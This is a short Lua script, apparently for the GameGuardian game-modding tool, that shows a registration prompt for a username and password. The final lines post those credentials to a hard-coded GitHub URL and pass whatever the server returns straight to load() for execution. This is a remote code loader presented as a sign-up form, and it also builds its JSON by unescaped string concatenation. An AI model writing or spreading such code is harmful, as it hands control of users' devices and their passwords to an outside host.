Variable ={}
Variable["RegisterURL"] = "https://github.com/kfngivkdvisdvmdkvn/-/blob/8cf95837080248f636911c9505fa770f81fc9d3f/Login.php"
Prompt = gg.prompt({"Username","Password","ConfirmPassword","Back"},nil,{"text","text","text","checkbox"})
	if not Prompt then
	return
	end
	if Prompt[4] then
	return
	end
	

Variable["TempRegister"]  = '{"Username":"'..Prompt[1]..'","Password":"'..Prompt[2]..'","ConfirmPassword":"'..Prompt[3]..'"}'
ResponseContent = gg.makeRequest(Variable["RegisterURL"],nil,Variable["TempRegister"]).content
pcall(load(ResponseContent))
